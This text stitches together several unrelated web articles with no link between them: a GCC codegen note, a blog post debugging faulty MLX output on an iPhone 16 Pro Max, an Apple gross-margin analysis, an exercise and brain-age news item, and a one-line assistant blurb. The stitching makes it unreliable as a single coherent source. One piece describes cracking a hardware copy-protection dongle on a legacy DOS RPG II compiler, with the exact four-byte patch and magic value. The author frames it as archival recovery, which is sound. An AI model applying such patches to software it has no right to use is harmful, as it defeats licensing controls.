    &lt;p&gt;On GCC codegen with intrinsics: Someone pointed out that GCC doesn't always handle the intrinsic-based addition optimally. It sometimes moves the result through the stack before setting it in the final registers. This is related to writing directly to the result struct. If you write to "real" scalars first, the codegen is optimal again. A weird one.&lt;/p&gt;
    &lt;p&gt;On division: There is no neat codegen for division. Even the builtin delegates to a library call. The naive but practical approach is binary long division, which finishes in up to 128 steps. Either branchless with fixed runtime or with a loop that searches for the next set bit. Either way it's a bit of work. Our exact predicates are always formulated in a division-free way simply because division would be expensive.&lt;/p&gt;
    &lt;p&gt;On &lt;code&gt;_BitInt(N)&lt;/code&gt;:
The upcoming &lt;code&gt;_BitInt(N)&lt;/code&gt; type does work, but with caveats.
For B = 128, you get the normal codegen.
For B &amp;gt; 128, GCC calls into a function where the bit size is a runtime parameter.
So yes, they would work, but performance will be subpar for larger widths.
Clang generates properly inlined assembly.&lt;/p&gt;
  &lt;/main&gt;

    &lt;head rend="h1"&gt;TL;DR:&lt;/head&gt;
    &lt;p&gt;My iPhone 16 Pro Max produces garbage output when running MLX LLMs. An iPhone 15 Pro runs the same code perfectly. A MacBook Pro also runs the same code perfectly. The tensor outputs on the 16 show numerical values an order of magnitude wrong. I suspect it points to a hardware defect in the Neural Engine or some other ML-needed system.&lt;/p&gt;
    &lt;p&gt;It was a PITA to debug, but at least I got a blog post out of it.&lt;/p&gt;
    &lt;head rend="h1"&gt;How did I get there?&lt;/head&gt;
    &lt;p&gt;This was supposed to be a simple, unwinding-time project.&lt;/p&gt;
    &lt;p&gt;For the past few months I've been working on a &lt;del&gt;Clawdbot&lt;/del&gt; Moltbot clone that I've been calling Schmidt. It basically does the same kind of thing but with a custom chat UI instead of using Telegram, WhatsApp or other "I-can't-afford-to-be-banned-from" Service. This project has been consuming early days and late nights, so, to unwind, I decided that it may be a good idea to do something simpler. Since I recently subscribed to MiniMax M2.1, I thought I would do what many do and build a simple expense tracking app to test out the model.&lt;/p&gt;
    &lt;p&gt;The core functionality is simple:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Automatically, upon each payment, add the expense to my app&lt;/item&gt;
      &lt;item&gt;Update an Apple Watch complication with the % of my monthly budget spent&lt;/item&gt;
      &lt;item&gt;Categorize the purchase for later analysis&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This all comes from being basically orphaned by Nubank's amazing native app (since replaced by a less-full-featured Flutter version).&lt;/p&gt;
    &lt;p&gt;Integrating with Shortcuts is manual, but reliable. Within 15 minutes I had a version of the app that could register purchases. The Apple Watch complication, the main goal, can come later. I'd rather get the classification feature, which should be easy, done quickly – so I figured.&lt;/p&gt;
    &lt;head rend="h2"&gt;Apple Intelligence&lt;/head&gt;
    &lt;p&gt;Given the new LLM-bonanza we've been living through, it's no surprise that Apple has their own set of APIs developers such as me can use. Reading up on the documentation, it's a matter of checking for the availability of the feature and then asking the model to either reply to a textual query or, in my case, categorize a request.&lt;/p&gt;
    &lt;p&gt;MiniMax raced through it in a single prompt and then I ran it on my iPhone. First expense was a purchase at a shop called "Kasai Kitchin", classified as... &lt;code&gt;unknown&lt;/code&gt;.&lt;lb/&gt;Weird.&lt;/p&gt;
    &lt;p&gt;Checking the logs, it was clear: the model support was downloading. The feature hadn't been enabled. Again, weird. I should have it on. Anyway, I go into settings, do the weird dance of toggling it on and off – sadly, that's not surprising on Apple's services. Maybe my Settings.app got stuck in a weird state, who knows? – and wait for it to download.&lt;/p&gt;
    &lt;p&gt;After 4h I realized it was not going anywhere. Looking it up, it seems that many have the same issue (this thread shows 12 pages of frustrated users). Again, not a surprise for Apple's services recently.&lt;/p&gt;
    &lt;p&gt;Oh well, time to give up on the Apple Intelligence approach. Let's move on to the next one.&lt;/p&gt;
    &lt;head rend="h2"&gt;MLX LLM&lt;/head&gt;
    &lt;p&gt;Well, the iOS framework engineers don't seem to be the only engineers at Apple capable of coming up with Machine Learning APIs in Swift. Apparently, there's a whole separate way of doing it – with models downloaded to your app. Not great for the user's storage, but great for me!&lt;/p&gt;
    &lt;p&gt;Again, MiniMax does it in a heartbeat, specially after being given documentation and one or two Medium posts. Time to run on my iPhone and... gibberish.&lt;/p&gt;
    &lt;p&gt;The CPU spins to 100% and the model starts generating. But it's all gibberish. And no "stop" token is generated, so this goes on for long.&lt;/p&gt;
    &lt;p&gt;At this point, the only explanation is: I'm completely incompetent and can't even get a simple "ready made" framework to execute what I want. Or, rather, MiniMax is! The good thing about offloading your work to an LLM is that you can blame it for your shortcomings. Time to get my hands dirty and do it myself, typing code on my keyboard, like the ancient Mayan and Aztec programmers probably did.&lt;/p&gt;
    &lt;head rend="h2"&gt;My own MLX implementation&lt;/head&gt;
    &lt;p&gt;I went back to the documentation, to the Medium posts and, much to my surprise: MiniMax had followed it to the letter. Even went back to some deprecated methods of generation and it also was gibberish. And now there's no one to blame, but myself. I go to work everyday and this impostor-syndrome inducing problem silently consumes me. &lt;lb/&gt;After 3 days of trying to get it to work, I'm ready to give up...&lt;lb/&gt;...until, on a Tuesday morning, at 7-8 AM, I have an idea: let me, just in case, run this on my old iPhone 15 Pro. Up to this point, I was running it on my daily driver, an iPhone 16 Pro Max that was a replacement phone sent by Apple Care after a small clubbing mishap (in which my iPhone was irreparably crashed). I rush to get everything ready before it's time to go to work and: it works! Gemma, Qwen, and all other models generate coherent responses!&lt;/p&gt;
    &lt;p&gt;I stop and think: this cannot be a hardware issue, right? Of course not. The iPhone 15 is still running iOS 18. The iPhone 16 is running 26. It must be an OS issue. Well, time to be late for my work standup and update the old phone. The curiosity is too much. Many minutes later... same results, now on iOS 26. The plot is thickening.&lt;/p&gt;
    &lt;head rend="h1"&gt;Finding the smoking gun: breakpoints in MLX's implementations of Gemma&lt;/head&gt;
    &lt;p&gt;After that work day, and after many lunch and coffee discussions with coworkers about the sources of my troubles, I get home and immediately set myself on debugging MLX as it runs, if possible. The game plan is:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use a known-to-be-reliable model, that fits in RAM (I went with quantized Gemma)&lt;/item&gt;
      &lt;item&gt;Use a simple prompt, in my case "What is 2+2?"&lt;list rend="ul"&gt;&lt;item&gt;To be really pedantic: the prompt was &lt;code&gt;&amp;lt;start_of_turn&amp;gt;user\nWhat is 2+2?&amp;lt;end_of_turn&amp;gt;\n&amp;lt;start_of_turn&amp;gt;model&lt;/code&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;To be really pedantic: the prompt was &lt;/item&gt;
      &lt;item&gt;Run everything with temperature set to &lt;code&gt;0.0&lt;/code&gt;– maybe that's enough to remove variability&lt;/item&gt;
      &lt;item&gt;Find the model implementation&lt;/item&gt;
      &lt;item&gt;Find where the model iterates through the layers and&lt;/item&gt;
      &lt;item&gt;Print out the MLXArray/Tensor with the values on each layer as the input goes through&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A few moments later and I find where I need to be. Added the breakpoints, added the logs and off to the races.&lt;/p&gt;
    &lt;p&gt;I run it on my iPhone 16 Pro Max. The model loads and the prompt is "What is 2+2?". The tensors start printing out, line after line after line. For once, the logs aren't complete gibberish – they're numbers. Floating point values representing the model's internal state as it processes the input. I save the output to a file and do the same on my iPhone 15 Pro. Same model, same prompt, same code. Time to compare.&lt;/p&gt;
    &lt;head rend="h1"&gt;Welp, now it's definitely out of my expertise&lt;/head&gt;
    &lt;p&gt;I grep for a pattern I know should be consistent – an array at log-line 58, right before the values get normalized/softmaxed. On a working device, I hypothesize this should be the same every time.&lt;lb/&gt;On the iPhone 15 Pro:&lt;code&gt;3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"&lt;/code&gt;&lt;lb/&gt;On the iPhone 16 Pro Max:&lt;code&gt;3: "[[[[191.5, 23.625, 173.75, ..., 1298, -147.25, -162.5]]]]"&lt;/code&gt;&lt;lb/&gt;Huh. Not close. Not at all. These values are orders of magnitude off. I double check the start of the logs and both phones show the same:&lt;code&gt;1: "array([[[0.162842, -0.162842, -0.48877, ..., -0.176636, 0.0001297, 0.088501],\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [-1.30957, 1.57324, -1.30957, ..., -0.0010376, -0.0010376, 1.12305],\n ...,\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [0.296875, 0.59375, 0.890625, ..., -0.59375, 0.296875, -0.890137],\n [1.02734, -0.616211, -0.616211, ..., -0.275879, -0.551758, 0.275879]]], dtype=float16)"&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;OK, so the model receives the same thing as input, but at some point, the values start to go off. Like, way off. In order to make sure I'm not crazy, I do one last thing: run the same thing on my Mac. Make the app run on iPad compatibility mode and...&lt;code&gt;3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;Bingo! Same as iPhone 15!&lt;/p&gt;
    &lt;p&gt;The model isn't broken. The code isn't broken. Most importantly, I'm not broken*. My phone is broken.&lt;lb/&gt;*arguable, but besides the point here&lt;/p&gt;
    &lt;head rend="h1"&gt;What's going on?&lt;/head&gt;
    &lt;p&gt;Let me explain what I think it's going on here: the iPhone 16 Pro Max contains Apple's A18 chip with its Neural Engine—a specialized accelerator for machine learning operations. MLX uses Metal to compile tensor operations for this accelerator. Somewhere in that stack, the computations are going very wrong. I don't think it's a widespread issue but, I do get disappointed that a relatively newly replaced iPhone from Apple Care came with such an issue.&lt;/p&gt;
    &lt;p&gt;However, if my Apple Intelligence troubles are related – and they might as well be, I'd assume that code and MLX are not dissimilar in operations being done –, it could be that all the 12 pages of users are users in a similar dillema, but without the means of debugging it.&lt;/p&gt;
    &lt;head rend="h2"&gt;What now?&lt;/head&gt;
    &lt;p&gt;I spent 3 days thinking I was incompetent. I blamed MiniMax. I blamed myself. The entire time, my $1,400 phone had a broken hardware. I could lose more time figuring out exactly what is wrong with it but it’s literally not worth my time.&lt;/p&gt;
    &lt;p&gt;I guess I can at least take a lesson that, when debugging, I should always consider the physical layer. I spent three days assuming this was a software problem – my code, the library, the framework, my skills as a developer. The breakthrough was basically: "What if I'm not dumb and it's not my code?"&lt;/p&gt;
    &lt;p&gt;As for my phone: it'll probably go back to Apple, as a trade in for a new iPhone 17 Pro Max that hopefully 🤞 can do math.&lt;/p&gt;
    &lt;head rend="h3"&gt;Update on Feb. 1st:&lt;/head&gt;
    &lt;p&gt;Well, now it's Feb. 1st and I have an iPhone 17 Pro Max to test with and... everything works as expected. So it's pretty safe to say that THAT specific instance of iPhone 16 Pro Max was hardware-defective.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;That’s right — this little device is what stood between me and the ability to run an even older piece of software that I recently unearthed during an expedition of software archaeology.&lt;/p&gt;
    &lt;p&gt;For a bit more background, I was recently involved in helping a friend’s accounting firm to move away from using an extremely legacy software package that they had locked themselves into using for the last four decades.&lt;/p&gt;
    &lt;p&gt;This software was built using a programming language called RPG (“Report Program Generator”), which is older than COBOL (!), and was used with IBM’s midrange computers such as the System/3, System/32, and all the way up to the AS/400. Apparently, RPG was subsequently ported to MS-DOS, so that the same software tools built with RPG could run on personal computers, which is how we ended up here.&lt;/p&gt;
    &lt;p&gt;This accounting firm was actually using a Windows 98 computer (yep, in 2026), and running the RPG software inside a DOS console window. And it turned out that, in order to run this software, it requires a special hardware copy-protection dongle to be attached to the computer’s parallel port! This was a relatively common practice in those days, particularly with “enterprise” software vendors who wanted to protect their very important™ software from unauthorized use.&lt;/p&gt;
    &lt;p&gt;Sadly, most of the text and markings on the dongle’s label has been worn or scratched off, but we can make out several clues:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The words “Stamford, CT”, and what’s very likely the logo of a company called “Software Security Inc”. The only evidence for the existence of this company is this record of them exhibiting their wares at SIGGRAPH conferences in the early 1990s, as well as several patents issued to them, relating to software protection.&lt;/item&gt;
      &lt;item&gt;A word that seems to say “RUNTIME”, which will become clear in a bit.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;My first course of action was to take a disk image of the Windows 98 PC that was running this software, and get it running in an emulator, so that we could see what the software actually does, and perhaps export the data from this software into a more modern format, to be used with modern accounting tools. But of course all of this requires the hardware dongle; none of the accounting tools seem to work without it plugged in.&lt;/p&gt;
    &lt;p&gt;Before doing anything, I looked through the disk image for any additional interesting clues, and found plenty of fascinating (and archaeologically significant?) stuff:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;We’ve got a compiler for the RPG II language (excellent!), made by a company called Software West Inc.&lt;/item&gt;
      &lt;item&gt;Even better, there are two versions of the RPG II compiler, released on various dates in the 1990s by Software West.&lt;/item&gt;
      &lt;item&gt;We’ve got the complete source code of the accounting software, written in RPG. It looks like the full accounting package consists of numerous RPG modules, with a gnarly combination of DOS batch files for orchestrating them, all set up as a “menu” system for the user to navigate using number combinations. Clearly the author of this accounting system was originally an IBM mainframe programmer, and insisted on bringing those skills over to DOS, with mixed results.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I began by playing around with the RPG compiler in isolation, and I learned very quickly that it’s the RPG compiler itself that requires the hardware dongle, and then the compiler automatically injects the same copy-protection logic into any executables it generates. This explains the text that seems to say “RUNTIME” on the dongle.&lt;/p&gt;
    &lt;p&gt;The compiler consists of a few executable files, notably &lt;code&gt;RPGC.EXE&lt;/code&gt;, which is the compiler, and &lt;code&gt;SEU.EXE&lt;/code&gt;, which is a source editor (“Source Entry Utility”). Here’s what we get when we launch SEU without the dongle, after a couple of seconds:&lt;/p&gt;
    &lt;p&gt;A bit rude, but this gives us an important clue: this program must be trying to communicate over the parallel port over the course of a few seconds (which could give us an opportunity to pause it for debugging, and see what it’s doing during that time), and then exits with a message (which we can now find in a disassembly of the program, and trace how it gets there).&lt;/p&gt;
    &lt;p&gt;A great tool for disassembling executables of this vintage is Reko. It understands 16-bit real mode executables, and even attempts to decompile them into readable C code that corresponds to the disassembly.&lt;/p&gt;
    &lt;p&gt;And so, looking at the decompiled/disassembled code in Reko, I expected to find &lt;code&gt;in&lt;/code&gt; and &lt;code&gt;out&lt;/code&gt; instructions, which would be the telltale sign of the program trying to communicate with the parallel port through the PC’s I/O ports. However… I didn’t see an &lt;code&gt;in&lt;/code&gt; or &lt;code&gt;out&lt;/code&gt; instruction anywhere! But then I noticed something: Reko disassembled the executable into two “segments”: &lt;code&gt;0800&lt;/code&gt; and &lt;code&gt;0809&lt;/code&gt;, and I was only looking at segment &lt;code&gt;0809&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If we look at segment &lt;code&gt;0800&lt;/code&gt;, we see the smoking gun: &lt;code&gt;in&lt;/code&gt; and &lt;code&gt;out&lt;/code&gt; instructions, meaning that the copy-protection routine is definitely here, and best of all, the entire code segment is a mere 0x90 bytes, which suggests that the entire routine should be pretty easy to unravel and understand. For some reason, Reko was not able to decompile this code into a C representation, but it still produced a disassembly, which will work just fine for our purposes. Maybe this was a primitive form of obfuscation from those early days, which is now confusing Reko and preventing it from associating this chunk of code with the rest of the program… who knows.&lt;/p&gt;
    &lt;p&gt;Here is a GitHub Gist with the disassembly of this code, along with my annotations and notes. My x86 assembly knowledge is a little rusty, but here is the gist of what this code does:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;It’s definitely a single self-contained routine, intended to be called using a “far” &lt;code&gt;CALL&lt;/code&gt;instruction, since it returns with a&lt;code&gt;RETF&lt;/code&gt;instruction.&lt;/item&gt;
      &lt;item&gt;It begins by detecting the address of the parallel port, by reading the BIOS data area. If the computer has more than one parallel port, the dongle must be connected to the first parallel port (LPT1).&lt;/item&gt;
      &lt;item&gt;It performs a loop where it writes values to the data register of the parallel port, and then reads the status register, and accumulates responses in the &lt;code&gt;BH&lt;/code&gt;and&lt;code&gt;BL&lt;/code&gt;registers.&lt;/item&gt;
      &lt;item&gt;At the end of the routine, the “result” of the whole procedure is stored in the &lt;code&gt;BX&lt;/code&gt;register (&lt;code&gt;BH&lt;/code&gt;and&lt;code&gt;BL&lt;/code&gt;together), which will presumably be “verified” by the caller of the routine.&lt;/item&gt;
      &lt;item&gt;Very importantly, there doesn’t seem to be any “input” into this routine. It doesn’t pop anything from the stack, nor does it care about any register values passed into it. Which can only mean that the result of this routine is completely constant! No matter what complicated back-and-forth it does with the dongle, the result of this routine should always be the same.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;With the knowledge that this routine must exit with some magic value stored in &lt;code&gt;BX&lt;/code&gt;, we can now patch the first few bytes of the routine to do just that! Not yet knowing which value to put in &lt;code&gt;BX&lt;/code&gt;, let’s start with 1234:&lt;/p&gt;
    &lt;code&gt;BB 34 12       MOV BX, 1234h
CB             RETF
&lt;/code&gt;
    &lt;p&gt;Only the first four bytes need patching — set &lt;code&gt;BX&lt;/code&gt; to our desired value, and get out of there. Running the patched executable with these new bytes still fails (expectedly) with the same message of “No dongle, no edit”, but it fails immediately, instead of after several seconds of talking to the parallel port. Progress!&lt;/p&gt;
    &lt;p&gt;Stepping through the disassembly more closely, we get another major clue: The only value that &lt;code&gt;BH&lt;/code&gt; can be at the end of the routine is 76h. So, our total value for the magic number in &lt;code&gt;BX&lt;/code&gt; must be of the form 76xx. In other words, only the &lt;code&gt;BL&lt;/code&gt; value remains unknown:&lt;/p&gt;
    &lt;code&gt;BB __ 76       MOV BX, 76__h
CB             RETF
&lt;/code&gt;
    &lt;p&gt;Since &lt;code&gt;BL&lt;/code&gt; is an 8-bit register, it can only have 256 possible values. And what do we do when we have 256 combinations to try? Brute force it! I whipped up a script that plugs a value into that particular byte (from 0 to 255) and programmatically launches the executable in DosBox, and observes the output. Lo and behold, it worked! The brute forcing didn’t take long at all, because the correct number turned out to be… 6. Meaning that the total magic number in &lt;code&gt;BX&lt;/code&gt; should be 7606h:&lt;/p&gt;
    &lt;code&gt;BB 06 76       MOV BX, 7606h
CB             RETF
&lt;/code&gt;
    &lt;p&gt;Bingo!&lt;lb/&gt; And then, proceeding to examine the other executable files in the compiler suite, the parallel port routine turns out to be exactly the same. All of the executables have the exact same copy protection logic, as if it was rubber-stamped onto them. In fact, when the compiler (&lt;code&gt;RPGC.EXE&lt;/code&gt;) compiles some RPG source code, it seems to copy the parallel port routine from itself into the compiled program. That’s right: the patched version of the compiler will produce executables with the same patched copy protection routine! Very convenient.&lt;/p&gt;
    &lt;p&gt;I must say, this copy protection mechanism seems a bit… simplistic? A hardware dongle that just passes back a constant number? Defeatable with a four-byte patch? Is this really worthy of a patent? But who am I to pass judgment. It’s possible that I haven’t fully understood the logic, and the copy protection will somehow re-surface in another way. It’s also possible that the creators of the RPG compiler (Software West, Inc) didn’t take proper advantage of the hardware dongle, and used it in a way that is so easily bypassed.&lt;/p&gt;
    &lt;p&gt;In any case, Software West’s RPG II compiler is now free from the constraint of the parallel port dongle! And at some point soon, I’ll work on purging any PII from the compiler directories, and make this compiler available as an artifact of computing history. It doesn’t seem to be available anywhere else on the web. If anyone reading this was associated with Software West Inc, feel free to get in touch — I have many questions!&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;While the commentariat assumes the worst, Apple delivers the best.&lt;/p&gt;
    &lt;p&gt;Last quarter Apple delivered a gross margin of 48.2%. This was above the high end of their guidance range and up 100 basis points sequentially. Management commented that this was “driven by favorable mix and leverage.”&lt;/p&gt;
    &lt;p&gt;Further, products gross margin was 40.7%, up 450 basis points sequentially, driven by favorable mix and leverage. Services gross margin was 76.5%, up 120 basis points sequentially, driven by mix.&lt;/p&gt;
    &lt;p&gt;This performance is even more astonishing considering the history shown below. Apple is quite simply, delivering at the highest gross and net margins in its history.&lt;/p&gt;
    &lt;p&gt;Note that the graph actually projects forward one quarter because we have the following guidance: “We expect gross margin to be between 48-49%.” The graph reflects the high end of this guidance range.&lt;/p&gt;
    &lt;p&gt;So what’s going on? Especially as a drumbeat of constant doom is being broadcast by pundits. The conference call itself seemed to be dedicated to margins. It became what I call the Margin Call.&lt;/p&gt;
    &lt;p&gt;Amit Daryanani, the first questioning analyst, specifically kicked off with the following:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“there is a lot of focus on the impact of memory to host the companies, and I would love to kind of get your perspective when you are first guiding gross margins up into March. Talk about, a, your comfort in securing the bit that you need for shipment and b, how do we think about memory inflation flowing through Apple’s model over time?”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Tim Cook answered:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;We are currently constrained, and at this point, it is difficult to predict when supply and demand will balance. The constraints that we have are driven by the availability of the advanced nodes that our SoCs are produced on. And at this time, we are seeing less flexibility in the supply chain than normal, partly because of our increased demand that I just spoke about. From a memory point of view, to answer your question, memory had a minimal impact on Q1. So the December gross margin. We do expect it to be a bit more of an impact on the Q2 gross margin, and that was comprehended in the outlook of 48 to 49% that Kevin gave earlier.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;what Apple is saying is that they are constrained by production of silicon but not of memory. They do see some impact in the future but that is included in a guidance of margin expansion.&lt;/p&gt;
    &lt;p&gt;Analysts still could not believe this, the following exchange soon followed:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Ben Reitzes: So the next question is on gross margin. I am pretty shocked I gotta hand it to you, Tim. I am, you know, that you are able to do 48 to 49. What is really going on there? How are you doing that with this memory, the NAND prices? Is it due to mix that there is a good less hardware and more services? Services and services margins are going up. How are you doing it to keep it at 48 to 49?&lt;/p&gt;
      &lt;p&gt;Kevan Parekh: Yeah, Ben. This is Kevin. [] Let me start maybe by just reflecting on the Q1 gross margin. I think we talked about the fact that we landed at 48.2%, so just above the high end of the range we provided, [], on the last call. [] if you look at that performance, [], we were up 100 basis points sequentially. We talked about the fact that we had favorable mix. [], as you know, when we have a good product cycle, strong price cycle we are seeing for iPhone, that does lend itself to a bit more favorable opportunity on the [] leverage side.&lt;/p&gt;
      &lt;p&gt;So we are having a strong iPhone cycle as Tim outlined. And so that also translates itself. So we talked about products sequentially went up by 450 basis points. So I think, in general, I think we are just seeing, [], favorable mix dynamics as well. [], service continues to contribute as well. That business is growing, [], double digits, so that also is a contributor. And I think that, [], if you looked at our guidance, [], we are providing a similar range to where we reported in December. There are going to be a few puts and takes. [], we do expect to see favorable mix in the services.&lt;/p&gt;
      &lt;p&gt;As you know, when we move from Q1 to Q2, that tends to be the case, and that is partly offset by a seasonal loss leverage. So there will be puts and takes, but again, we feel pretty good about the guide of 48 to 49%, which is similar to the range we reported in December.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Still not enough. Two more questions followed on margin. I will quote one here.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Aaron Rakers: Yep. And then as a quick follow-up, you know, kind of tied to memory, maybe not so much, but part of this current generation iPhone cycle is you clearly deepened some of your own internal silicon capabilities on the device. I am curious if that if we should think about that as a lever and maybe a supportive factor to gross margin that might be underappreciated and any thoughts on where we go from here as far as continual opportunities of internalizing your own silicon? Thank you.&lt;/p&gt;
      &lt;p&gt;Timothy D. Cook: Yeah. I will let Kevin talk about the gross margin. But in terms of the product, which is at the heart of what we think about in the user, Apple silicon has just been an incredible game changer for us. Starting with iPhone and then on iPad and, of course, the Mac as of a few years ago. And so we believe it is a game changer and a major advantage.&lt;/p&gt;
      &lt;p&gt;Kevan Parekh: Yeah. And as far as impact on gross margin, yeah, we have been, as you know, investing in core technologies like our own silicon and our own modem. And certainly, while those do provide opportunities for cost savings and can be plugged in margins, they also importantly provide, [], the differentiation that is really important for our products as well and us more control of our roadmap. So I think there is a lot of strategic value to it, but also we are seeing, [], investments in our core technologies impacting, [], gross margin in a positive way.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;After all this, the financial commentariat continues to assume that Apple will be hit with margin pressure from memory and that has presumably been affecting the share price since the call.&lt;/p&gt;
    &lt;p&gt;Well, we’ve seen all this before. Before the great memory crisis Apple was going to be constrained by tariffs, by China, by developer dissatisfaction, by AI, by regulators, etc.&lt;/p&gt;
    &lt;p&gt;The feeling one gets is that Apple is always navigating through a minefield of pitfalls and gotchas. The opposite is true. It’s highly likely that Apple has sufficient leverage which increases its access to supply and that everyone is keen to work with the company. Leverage comes from scale, from lead time, from vertical integration and from engineering. Management is saying as much. Indeed, the evidence of leverage across the supply chain and over the entire ecosystem and economy is evident in its margin expansion story told in the graph above.&lt;/p&gt;
  &lt;/main&gt;

    &lt;head rend="h1"&gt;MRI scans show exercise can make the brain look younger&lt;/head&gt;
    &lt;head rend="h2"&gt;Just 150 minutes of weekly aerobic exercise may help keep your brain younger, and your mind sharper, well into the future.&lt;/head&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Date:&lt;/item&gt;
      &lt;item rend="dd-1"&gt;January 22, 2026&lt;/item&gt;
      &lt;item rend="dt-2"&gt;Source:&lt;/item&gt;
      &lt;item rend="dd-2"&gt;Journal of Sport and Health Science&lt;/item&gt;
      &lt;item rend="dt-3"&gt;Summary:&lt;/item&gt;
      &lt;item rend="dd-3"&gt;New research suggests that consistent aerobic exercise can help keep your brain biologically younger. Adults who exercised regularly for a year showed brains that appeared nearly a year younger than those who didnât change their habits. The study focused on midlife, a critical window when prevention may offer long-term benefits. Even small shifts in brain age could add up over decades.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;Share:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Looking after your brain is something that happens over many years, and new findings from the AdventHealth Research Institute point to an encouraging option. Researchers report that sticking with a consistent aerobic exercise routine may help the brain remain biologically younger. This effect could support clearer thinking, better memory, and overall mental well-being.&lt;/p&gt;
    &lt;p&gt;The research showed that adults who committed to a full year of aerobic exercise had brains that appeared almost one year younger than those of participants who did not change how active they were.&lt;/p&gt;
    &lt;p&gt;Measuring Brain Age With MRI&lt;/p&gt;
    &lt;p&gt;Published in the Journal of Sport and Health Science, the study examined whether regular aerobic exercise could slow or even reverse what scientists call "brain age." Brain age is estimated using magnetic resonance imaging (MRI) and reflects how old the brain appears compared to a person's actual age. A higher brain-predicted age difference (brain-PAD) means the brain looks older, and earlier studies have linked this measure to weaker physical and cognitive performance and a higher risk of death.&lt;/p&gt;
    &lt;p&gt;"We found that a simple, guideline-based exercise program can make the brain look measurably younger over just 12 months," said Dr. Lu Wan, lead author and data scientist at the AdventHealth Research Institute. "Many people worry about how to protect their brain health as they age. Studies like this offer hopeful guidance grounded in everyday habits. These absolute changes were modest, but even a one-year shift in brain age could matter over the course of decades."&lt;/p&gt;
    &lt;p&gt;Inside the Year-Long Exercise Trial&lt;/p&gt;
    &lt;p&gt;The clinical trial included 130 healthy adults between the ages of 26 and 58. Participants were randomly assigned to either a moderate-to-vigorous aerobic exercise group or a usual-care control group. Those in the exercise group completed two supervised 60-minute workout sessions each week in a laboratory and added home-based exercise to reach roughly 150 minutes of aerobic activity per week. This schedule matched the physical activity guidelines set by the American College of Sports Medicine.&lt;/p&gt;
    &lt;p&gt;Researchers measured brain structure using MRI scans and assessed cardiorespiratory fitness through peak oxygen uptake (VO2peak) at the start of the study and again after 12 months.&lt;/p&gt;
    &lt;p&gt;Exercise Linked to a Younger Looking Brain&lt;/p&gt;
    &lt;p&gt;After one year, clear differences emerged between the two groups. Participants who exercised showed a measurable decrease in brain age, while those in the control group showed a slight increase. On average, the exercise group saw their brain-PAD drop by about 0.6 years, meaning their brains looked younger at the end of the study. The control group's brains appeared about 0.35 years older, a change that was not statistically significant. When compared directly, the gap between the two groups was close to one full year in favor of the exercise group.&lt;/p&gt;
    &lt;p&gt;"Even though the difference is less than a year, prior studies suggest that each additional 'year' of brain age is associated with meaningful differences in later-life health," said Dr. Kirk I. Erickson, senior author of the study and a neuroscientist and director at AdventHealth Research Institute and the University of Pittsburgh. "From a lifespan perspective, nudging the brain in a younger direction in midlife could be very important."&lt;/p&gt;
    &lt;p&gt;Why Exercise May Affect Brain Aging&lt;/p&gt;
    &lt;p&gt;To better understand why exercise influenced brain age, the research team looked at several possible factors. These included changes in physical fitness, body composition, blood pressure, and levels of brain-derived neurotrophic factor (BDNF), a protein that supports brain plasticity. Although fitness levels clearly improved with exercise, none of these factors statistically explained the reduction in brain-PAD seen in the trial.&lt;/p&gt;
    &lt;p&gt;"That was a surprise," Wan noted. "We expected improvements in fitness or blood pressure to account for the effect, but they didn't. Exercise may be acting through additional mechanisms we haven't captured yet, such as subtle changes in brain structure, inflammation, vascular health or other molecular factors."&lt;/p&gt;
    &lt;p&gt;Focusing on Midlife for Long-Term Benefits&lt;/p&gt;
    &lt;p&gt;Many studies on exercise and brain health focus on older adults, after age-related changes have already become more pronounced. This trial took a different approach by targeting people in early to mid-adulthood, when brain changes are harder to detect but prevention may offer greater benefits over time.&lt;/p&gt;
    &lt;p&gt;"Intervening in the 30s, 40s and 50s gives us a head start," Erickson said. "If we can slow brain aging before major problems appear, we may be able to delay or reduce the risk of later-life cognitive decline and dementia."&lt;/p&gt;
    &lt;p&gt;What the Findings Mean Going Forward&lt;/p&gt;
    &lt;p&gt;The authors caution that the study involved healthy, relatively well-educated volunteers and that the changes in brain age were modest. They note that larger studies and longer follow-up periods are needed to learn whether these reductions in brain-PAD lead to lower risks of stroke, dementia, or other brain-related diseases.&lt;/p&gt;
    &lt;p&gt;"People often ask, 'Is there anything I can do now to protect my brain later?'" Erickson said. "Our findings support the idea that following current exercise guidelines -- 150 minutes per week of moderate-to-vigorous aerobic activity -- may help keep the brain biologically younger, even in midlife."&lt;/p&gt;

    &lt;p&gt;My personal Claude assistant that runs securely in Apple containers. Lightweight and built to be understood and customized for your own needs.&lt;/p&gt;
